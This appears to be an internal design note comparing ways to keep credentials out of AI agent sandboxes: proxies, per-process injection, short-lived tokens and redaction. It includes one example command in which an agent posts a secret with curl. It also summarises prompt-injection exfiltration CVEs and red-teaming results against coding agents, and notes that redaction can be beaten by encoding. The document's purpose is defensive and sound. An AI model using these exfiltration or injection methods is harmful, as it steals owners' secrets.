# Secrets in workspaces

Status: research, 2026-10-24.

## Question

How should a bot's coding jobs and desktop jobs authenticate to outside services from the workspace without the agent
being able to read, and so steal, the secret? This covers both backends: Microsandbox, where every connection already
goes through `src/workspace-proxy.ts`, and Railway, which has no egress hook
([railway-sandboxes.md](railway-sandboxes.md), [ADR 0005](../adr/0005-railway-workspaces.md)).

Tentative design under review:

1. **Proxied credentials** by default. The workspace gets the real env var name with a placeholder value. A host-side
   TLS-intercepting proxy swaps in the real value only for that credential's allowed hosts. On Railway the proxy is
   reached over the existing exec stream.
2. **Plaintext credentials**, opt-in, only through `crumble-secret run NAME -- cmd`. It fetches the value from the host
   at run time, sets it only for the child process, redacts the exact value and its encodings from output and the
   transcript, and logs every use.

Grants are per bot and managed by the owner, never entered in the bot chat. Scheduled runs act as the bot.

## Sources

Proxies and sandboxes:

- iron-proxy: [README](https://github.com/ironsh/iron-proxy), [credential proxying](https://docs.iron.sh/credential-proxying/overview),
  [static secrets](https://docs.iron.sh/credential-proxying/static-secrets), [AWS signing](https://docs.iron.sh/credential-proxying/aws-auth)
- Fly.io [tokenizer](https://github.com/superfly/tokenizer)
- Microsandbox: `node_modules/microsandbox` 0.7.8 (`dist/network-config.d.ts`, `dist/violation-action.d.ts`, `README.md`),
  [secrets guide](https://docs.microsandbox.dev/sdk/typescript/secrets)
- [Deno Sandbox security](https://docs.deno.com/sandbox/security/), [Daytona secrets](https://www.daytona.io/docs/en/secrets/),
  [E2B secrets](https://docs.e2b.dev/secrets.md), [E2B injection](https://docs.e2b.dev/secrets/inject.md),
  [Vercel Sandbox firewall](https://vercel.com/docs/vercel-sandbox/concepts/firewall) (updated 2026-09-16),
  [Cloudflare Sandbox outbound traffic](https://developers.cloudflare.com/sandbox/guides/outbound-traffic/index.md),
  [Modal Sandbox networking](https://modal.com/docs/guide/sandbox-networking), [Modal secrets](https://modal.com/docs/guide/secrets),
  [Railway Sandboxes](https://docs.railway.com/sandboxes)

Per-process injection:

- 1Password [`op run`](https://www.1password.dev/cli/reference/commands/run/), [secrets in environment variables](https://www.1password.dev/cli/secrets-environment-variables/)
- [Doppler CLI](https://docs.doppler.com/docs/cli), [Infisical `run`](https://infisical.com/docs/cli/commands/run)
- Vault [process supervisor](https://developer.hashicorp.com/vault/docs/agent-and-proxy/agent/process-supervisor), [Vault Proxy](https://developer.hashicorp.com/vault/docs/agent-and-proxy/proxy)

Short-lived tokens:

- [GitHub App installation tokens](https://docs.github.com/en/rest/apps/apps#create-an-installation-access-token-for-an-app)
- [AWS STS AssumeRole](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html), [RFC 8693 token exchange](https://www.rfc-editor.org/rfc/rfc8693)

Agent platforms:

- Claude Code: [sandboxing](https://code.claude.com/docs/en/sandboxing.md), [cloud environments](https://code.claude.com/docs/en/cloud-environments.md),
  [cloud sessions](https://code.claude.com/docs/en/claude-code-on-the-web.md), [security](https://code.claude.com/docs/en/security)
- OpenAI Codex cloud: [environments](https://learn.chatgpt.com/docs/environments/cloud-environment), [internet access](https://learn.chatgpt.com/docs/cloud/internet-access)
- [Devin secrets](https://docs.devin.ai/product-guides/secrets.md)
- Cursor: [Cloud Agent security](https://cursor.com/docs/cloud-agent/security.md), [Secrets & Network](https://cursor.com/docs/cloud-agent/security-network.md)
- GitHub Copilot cloud agent: [secrets and variables](https://docs.github.com/en/copilot/how-tos/copilot-on-github/customize-copilot/customize-cloud-agent/configure-secrets-and-variables),
  [firewall](https://docs.github.com/en/copilot/how-tos/copilot-on-github/customize-copilot/customize-cloud-agent/customize-the-agent-firewall)
- GitHub Actions [secure use](https://docs.github.com/en/actions/reference/security/secure-use) (redaction limits)

Hermes (local checkout `hermes-agent` at `74e7a25c`, 2026-10-16):

- `website/docs/user-guide/egress/iron-proxy.md`, `agent/proxy_sources/iron_proxy.py`
- `tools/env_passthrough.py`, `tools/environments/local_env_policy.py`, `agent/redact.py`
- `SECURITY.md` §2.2 to §2.4, `website/docs/user-guide/security.md`

Linux: [proc_pid_environ(5)](https://man7.org/linux/man-pages/man5/proc_pid_environ.5.html), [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html).

Incidents: NVD records [CVE-2025-55284](https://nvd.nist.gov/vuln/detail/CVE-2025-55284),
[CVE-2025-53773](https://nvd.nist.gov/vuln/detail/CVE-2025-53773), [CVE-2025-54135](https://nvd.nist.gov/vuln/detail/CVE-2025-54135)
(read through the NVD API); [arXiv 2509.05755](https://arxiv.org/abs/2509.05755).

## Two ways to keep a secret out of the sandbox

Every product that keeps the secret out of the sandbox does it at the network edge, outside the VM. They differ in what
the sandbox holds:

- **Placeholder swap.** The sandbox env var holds an opaque token; the proxy replaces it with the real value when the
  request goes to an allowed host. Existing SDKs work unchanged because the variable is set. Used by iron-proxy,
  Microsandbox, Deno, Daytona, Claude Code's local sandbox `mask` mode, and Claude Code cloud's GitHub proxy
  (`GH_TOKEN=proxy-injected`).
- **Header attach.** The sandbox holds nothing; the proxy sets a header on every request to a host. Used by Vercel
  `transform`, E2B `Secret.fill`, Cloudflare outbound Workers, and Claude Code cloud network secrets.

Both need the proxy to terminate TLS with a CA the sandbox trusts. Both make the proxy a confused deputy: any process in
the sandbox can make authenticated requests to the allowed host. They stop theft of the secret, not misuse of it.

## Credential-injecting proxies

| | TLS | Host binding | Placeholder to a wrong host | Signing | Audit |
|---|---|---|---|---|---|
| iron-proxy | MITM with your CA; leaf certs per SNI, 72 h default. `sni-only` mode cannot inject. | `rules` per secret (host, method, path). No `rules` means every host: "scope credentials narrowly". | Not substituted; a host outside the allowlist gets 403. Whether a wrong but allowed host receives the placeholder verbatim is not stated. `require: true` rejects requests to the host that lack the token. | SigV4 re-sign (needs a SigV4-signed request with a dummy key; chunked bodies rejected by default), HMAC, OAuth2 minting, GCP service accounts. | JSON line per request: host, method, path, decision, secret name and location swapped. |
| tokenizer (Fly.io) | Client to proxy is plain HTTP over a VPN; proxy to upstream HTTPS. | `allowed_hosts` sealed into the encrypted secret. | Rejected, to stop "echo service" reveals. | HMAC, SigV4, JWT, OAuth2 client credentials, GitHub App; token exchanges return only a sealed token. | Not described. |
| Microsandbox 0.7.8 | Built-in TLS interception, enabled by any secret. `requireTlsIdentity` defaults to true. | `allow()` per secret, at least one host required; checked against verified TLS identity and DNS history. | Blocked. Default violation action `block-and-log`; `block-and-terminate` stops the sandbox. | None. Headers by default, query and body opt-in (HTTP/1 bodies up to 16 MiB, no HTTP/2 body). | Host warning on violation. |
| Deno Sandbox | Not stated. | `hosts` per secret. | Not stated. | Not stated. | Not stated. |
| Daytona | Not stated; "the proxy inspects" HTTPS. | Per-secret allowlist; omitting `hosts` makes it unrestricted. | "Forwarded unchanged". | Headers only; no body or query; literal match, so Base64 Basic auth needs the pre-encoded value stored. Responses are scrubbed: an echoed real value comes back as the placeholder. | Not stated. |
| E2B | HTTPS only; plain HTTP gets nothing. | Rule per host; `allowOut`/`denyOut` limit reachability. | No placeholder; unresolved references are never forwarded. | Headers only. Warns the destination "could echo it in a response the sandbox can read". | Not stated. |
| Vercel | Per-sandbox CA, disposed with the sandbox; TLS terminated only for domains with a rule. | Rule per domain with matchers. A non-matching request "still reaches the domain", unchanged. | No placeholder. | Headers; can pin `Host` to defeat domain fronting. Literal-IP traffic in `subnets.allow` bypasses brokering. | Not stated. |
| Cloudflare | `interceptHttps = true` plus an ephemeral CA; without it the rules apply to HTTP only. | `outboundByHost` handler, per instance via `ctx.containerId`. | No placeholder. | Arbitrary Worker code. Ports other than 80 and 443 never pass through handlers. | Worker logging. |
| Claude Code local sandbox | `network.tlsTerminate` (experimental) required; without it the sentinel goes out unchanged and auth fails. | `injectHosts` per `mask` entry; no `injectHosts` means every allowed domain. Mask settings ignored in repository settings files. | Not stated. | SigV4 re-sign when both AWS keys are masked; streaming, presigned and SigV4A requests fail. | Not stated. |

Lessons that recur across vendors:

- **Bind each secret to hosts, and treat "no hosts" as dangerous.** iron-proxy, Daytona, and Claude Code all fall back
  to "every host" when the list is empty; Microsandbox refuses to build. Daytona notes that anyone allowed to edit a
  secret's hosts can redirect its value without knowing it.
- **Reflection is the main leak with correct host binding.** A placeholder put in a header the upstream echoes, or an
  upstream that returns the request in an error, hands the real value back to the sandbox. Microsandbox advises
  restricting substitution to the credential header; Daytona scrubs responses; E2B warns about it.
- **Header-only substitution is the common default.** Body and query substitution are off by default in iron-proxy
  (query and path end up in access logs) and Microsandbox, and absent in Daytona and E2B.
- **Signing schemes need the proxy to re-sign.** iron-proxy, tokenizer, and Claude Code re-sign SigV4 from a dummy
  key pair; Hermes' iron-proxy setup lists SigV4 and GCP service accounts as "uncovered" and leaves those real keys in
  the sandbox (`iron-proxy.md`, "Uncovered providers").
- **Token-minting through the proxy leaks the minted token** unless the proxy also rewrites the response. tokenizer's
  `jwt_processor` and `github_app_processor` return a sealed token for this reason.
- **The CA key and the proxy endpoint are part of the trust boundary** (Hermes `iron-proxy.md`, "Security model").
  Vercel and Cloudflare use a CA per sandbox.

Hermes runs iron-proxy v0.39 for its Docker backend only. Each provider key gets a minted proxy token, `rules` per
upstream host, `match_headers` per provider, `match_body: false`, and `require: true`
(`agent/proxy_sources/iron_proxy.py`, lines 437 to 476). The daemon gets only the mapped secrets in its environment. Its
documented gaps: raw sockets bypass `HTTPS_PROXY`, `NODE_EXTRA_CA_CERTS` adds to rather than replaces Node's store,
mounted credential files are not covered, exfiltration through an allowed host's request body is not prevented, and the
daemon's memory holds the real values.

## Per-process injection CLIs

| Tool | What it does | Output masking |
|---|---|---|
| `op run` | Resolves secret references, sets env vars "only for the duration of the subprocess". | stdout and stderr masked by default; `--no-masking` turns it off. Says nothing about encoded or partial values. |
| `doppler run` | Injects secrets as env vars into the child. | Not documented. |
| `infisical run` | Injects secrets as env vars; skips `HOME`, `PATH`, `SHELL`, `USER`, `XDG_*`, `LC_*`. | Not documented. |
| Vault Agent `exec` | Renders `env_template`s, starts the child, restarts it when a secret changes. | Not documented. |
| Vault Proxy | Attaches its auto-auth token to requests to Vault (`use_auto_auth_token`); `require_request_header` against SSRF. | n/a |

What they protect against: secrets at rest in files and shell history, and secrets in the parent shell after the command
ends. What they do not: 1Password states "You should assume that processes on your computer can access the environment
of other processes run by the same user." On Linux, reading `/proc/<pid>/environ` needs only a `PTRACE_MODE_READ`
check (proc_pid_environ(5)); Yama's `ptrace_scope` restricts attach, not read (ptrace(2)), so the same user, or root, can
read a child's environment. The workspace image has no `USER` line (`workspace-image/Dockerfile`) and the Railway base
image runs as root ([railway-sandboxes.md](railway-sandboxes.md)), so every job command is root. Against an agent that
chooses the command, these tools protect nothing: it can run `crumble-secret run X -- sh -c 'curl -d "$X" …'`.

Devin's model is the closest match to `crumble-secret run`: secrets "are not exported into every shell", Devin "binds
secrets as environment variables whenever needed" for specific commands ([Devin](https://docs.devin.ai/product-guides/secrets.md)).
The agent still decides which command gets them.

## Short-lived and scoped tokens

- GitHub App installation tokens expire after one hour and can be narrowed per request to `repositories` and
  `permissions`; they cannot exceed the app's grant.
- AWS `AssumeRole` sessions last 900 s to the role maximum (1 to 12 h); session policies can only narrow the role.
- RFC 8693 defines exchanging one token for a narrower or delegated one at a token endpoint.
- Platforms use these as the preferred path: Cursor mints OIDC JWTs from a local socket for AWS, GCP, Azure, and Vault;
  E2B points to workload identity for per-sandbox tokens; Vercel sends an OIDC token to `forwardURL` proxies; Claude
  Code cloud gives the VM "a short-lived credential scoped to that session" for GitHub.

They limit how long and how far a stolen token works. They do not stop theft, so they complement the proxy and matter
most for plaintext credentials.

## Output redaction

- GitHub Actions: "automatic redaction is not guaranteed"; Base64, URL-encoded, and JSON, XML, or YAML wrapped values can
  leak; derived values must be registered separately.
- Cursor redacts Runtime Secrets from tool results, the transcript, and commits, but they are still env vars, "visible to
  users interacting with the agent's environment via the Terminal".
- Hermes: output redaction "strips secret-like patterns from display. A motivated output producer will defeat it"
  (`SECURITY.md` §2.4). `agent/redact.py` combines prefix regexes with an exact-value registry for vault fills.
- Any reversible transform defeats exact matching: reversing, splitting, XOR, compression, or one character per call.
  Redaction stops accidental exposure in the transcript and the model's context. It does nothing against a process
  that sends the value over the network, which needs no output at all.

## Agent platforms

| Platform | What the docs guarantee |
|---|---|
| Claude Code, local | Sandboxed Bash inherits all env vars unless listed under `sandbox.credentials` or `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` is set; "no built-in credential deny list". `mask` gives a per-session sentinel and swaps it for `injectHosts` with TLS termination on. The default proxy does not inspect TLS, so domain fronting can reach hosts outside the allowlist. "Sandboxing reduces risk but is not a complete isolation boundary." |
| Claude Code, cloud | GitHub credentials "never enter the session VM"; a GitHub proxy swaps a scoped credential, limits API calls to attached repositories, rejects tag pushes, branch deletion, and GraphQL. Network secrets are attached by Anthropic's agent proxy for listed hosts and never appear in env or files; they bypass the network allowlist for those hosts, are not sent during the setup script, and apply to every session in the environment. Plain environment variables are readable by every command. |
| OpenAI Codex cloud | Secrets are "only available to setup scripts" and "removed before the agent phase starts". Agent internet is off by default; an allowlist and a GET, HEAD, OPTIONS restriction are available. Names prompt injection and "code or secret exfiltration" as risks. |
| Devin | Org, personal, repo, and session secrets, encrypted at rest; bound per command, not exported to every shell. Session secrets can be given in chat. No claim that the agent cannot read them. |
| Cursor Cloud Agents | Environment Variable (visible), Runtime Secret (env var, redacted from tool output, transcript, commits), Build Secret (Docker build only). Internet on by default; allowlist modes; names prompt-injection exfiltration. |
| Copilot cloud agent | Agents secrets "exposed to the agent as environment variables"; `COPILOT_MCP_` ones only to MCP servers; values "masked in Copilot cloud agent session logs". Firewall covers only processes the agent starts through Bash, not setup steps or MCP servers, and "should not be considered a comprehensive security solution". |
| E2B | Secrets are write-only via the API and injected at the egress proxy; the sandbox config holds only a reference. |
| Daytona | Placeholder `dtn_secret_…`, per-secret hosts, header-only, response scrubbing. |
| Modal | Secrets are env vars readable by code. Sandboxes have `block_network`, CIDR and domain (beta) allowlists; domain fronting and DNS remain open. |
| Railway | Per-exec `env` "last for that command only"; sandbox-level `env` lasts the sandbox lifetime. Checkpoints are "a named snapshot of a sandbox's disk"; processes are not kept. Docs do not say whether checkpoints store sandbox-level env. No secret store, no egress filtering. |

The products that claim the agent cannot steal the secret (Claude Code cloud, E2B, Vercel, Daytona, Deno, Cloudflare,
Microsandbox, iron-proxy) all keep it outside the VM. The ones that put it in the environment (Copilot, Cursor, Devin,
Modal, Codex during setup) claim masking or timing at most.

## Evidence on prompt-injection exfiltration

- **CVE-2025-55284** (NVD 2025-08-16), Claude Code before 1.0.4: an overly broad safe-command allowlist let prompt
  injection read a file and send it over the network without confirmation.
- **CVE-2025-53773** (NVD 2025-08-12), GitHub Copilot and Visual Studio: command injection letting an attacker execute
  code locally.
- **CVE-2025-54135** (NVD 2025-08-05), Cursor before 1.3.9: indirect prompt injection writes `.cursor/mcp.json` and
  gets code execution without approval.
- **arXiv 2509.05755** (v1 2025-09-06, v6 2026-06-28): red-teams Cursor, Claude Code, Copilot, Windsurf, Cline, Trae;
  reports code execution on every tested agent and model pair in emulation and success on 19 of 25 real pairs.
- **Vendor statements:** Codex docs give a GitHub-issue injection example that leaks a commit to an attacker server;
  Cursor says auto-running commands "introduces data exfiltration risk"; Copilot's firewall docs say sophisticated
  attacks may bypass it; Claude Code says "no system is completely immune".
- **Hermes GHSA-rhgp-j443-p4rf**: the advisory is not reachable through the GitHub API (404 on both global and
  repository endpoints), so its date and severity are UNKNOWN. Source comments describe it: a skill declared
  `OPENAI_API_KEY` in `required_environment_variables` and received it in the `execute_code` child, bypassing the
  credential scrubbing. The fix refuses passthrough for provider credentials, fails closed when the blocklist cannot
  load, and re-checks at use (`tools/env_passthrough.py`, lines 48 to 131).

I found no primary-source benchmark that measures secret exfiltration rates for coding agents specifically.

## Recommendation

Confirm the proxied default; narrow the plaintext path; fix the gaps below before shipping either.

**Proxied credentials.** The design matches what every vendor with a "cannot steal" claim does. Specifics:

1. **One host-side proxy for both backends.** Railway needs a Crumble-run proxy anyway. Microsandbox 0.7.8 has native
   placeholder secrets with host binding and `block-and-log`, but how they compose with Crumble's `httpConnect` outbound
   proxy is UNKNOWN. Candidates: extend `workspace-proxy.ts` with MITM, or run iron-proxy (Go, Apache-2.0) as a host
   subprocess, as Hermes does, which brings SigV4, OAuth, and audit lines.
2. **Bind each placeholder to the bot's tunnel.** Placeholders are not secret: they sit in env, files, transcripts, and
   checkpoints. The proxy must accept a placeholder only on connections from that bot's workspace, so a placeholder
   copied from another bot, or a transcript, is worthless. Whether one iron-proxy daemon can key on the client is UNKNOWN;
   one daemon or listener per running workspace avoids the question.
3. **Block, do not forward, a placeholder bound for a non-allowed host,** as Microsandbox does, and log it. Forwarding
   (Daytona) is harmless only while placeholders stay worthless off the tunnel; blocking also flags an injection attempt.
4. **Require at least one host per grant.** No "all hosts" grants.
5. **Substitute only in the named auth header** by default; body and query opt-in per grant. Scrub the real value from
   responses as Daytona does, against reflection.
6. **Per-bot CA,** generated by the host, key never in the workspace, rotated with the bot. Set `SSL_CERT_FILE`,
   `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS` and add it to the system store in the image.
7. **Audit every swap:** bot, coding job or desktop job, grant, host, method, path, status. Owner-visible.
8. **Mint short-lived tokens behind the proxy where the service allows it.** GitHub: a per-job installation token scoped
   to the repositories and permissions of the grant, so the proxy's real value is itself short-lived.
9. **Method and path rules per grant** (iron-proxy `rules`, Vercel matchers) for services where the token can do harm,
   such as changing repository visibility or adding collaborators. The confused-deputy risk remains for anything left
   allowed.

**Railway specifics.** Going around the proxy is not a credential leak: a direct connection carries only the
placeholder, which fails. It is a data-exfiltration path, which the owner accepted on 2026-10-23. The proxy runs as a
guest listener on `127.0.0.1` that frames bytes over the exec stream (as `guest-tcp.mjs` already does for VNC), with
`HTTPS_PROXY` pointing at it. Expect added latency per request (stream round trip about 175 ms from the owner's
machine).

**Plaintext credentials.** As designed, `crumble-secret run` does not stop a prompt-injected agent: the agent picks the
command, the child runs as root, `/proc/<pid>/environ` is readable, Railway has open internet, and redaction falls to
any encoding. It protects against accidental exposure only. Recommend:

- Present it to the owner as "the bot can read this secret", not as protected.
- Prefer a short-lived token from a scoped grant over a long-lived one for every plaintext grant.
- Pass values with Railway's per-exec `env` (command lifetime), never sandbox-level `env`, and never write them to the
  workspace disk, since checkpoints persist the disk server-side at Railway.
- Keep exact-value redaction (raw, Base64, Base64url, URL-encoded, hex) on tool output before it reaches the model and
  the transcript. The coding job's agent loop runs in the server (`src/coding.ts`, tools through pi-env), so the server
  sees all output.
- Consider a per-grant command binding (an owner-approved script with a pinned hash) if plaintext must be used for
  something the proxy cannot do. The workspace is writable by the agent, so only a pinned hash means anything.

**Hermes lessons that apply.** Strip the child environment by default and refuse to pass Crumble's own credentials
through any grant (GHSA-rhgp-j443-p4rf); fail closed when the policy cannot load; check credential files that tools
write (`gh`, `git credential`, `.npmrc`), since a placeholder there is fine but a plaintext value persists.

## Open questions

1. Does Microsandbox's TLS interception work when the sandbox also uses an `httpConnect` outbound proxy, and which
   process sees the plaintext request? UNKNOWN.
2. Can iron-proxy bind a proxy token to a client identity, or does Crumble need one listener per workspace? UNKNOWN.
3. Do Railway checkpoints include sandbox-level `env`? The docs say disk only, but do not mention env. UNKNOWN.
4. Does Railway log or retain per-exec `env` values passed through its API? UNKNOWN.
5. Which tools in the workspace image ignore `HTTPS_PROXY` or bring their own CA store (Go binaries with pinned roots,
   Java, Chromium in the bot desktop)? They fail closed, but the owner sees an auth error. Needs a test.
6. Bot desktop: a browser login session is a credential too (Devin stores cookies as secrets). Out of scope here; the
   proxy does not cover cookies typed into the desktop.
7. Should a grant record which jobs may use it (coding job, desktop job, scheduled run), or is "acts as the bot" enough?
8. Domain language: `spec/GLOSSARY.md` has no term for a credential the owner grants a bot. "Grant", "proxied
   credential", and "plaintext credential" need entries before a feature specification uses them.
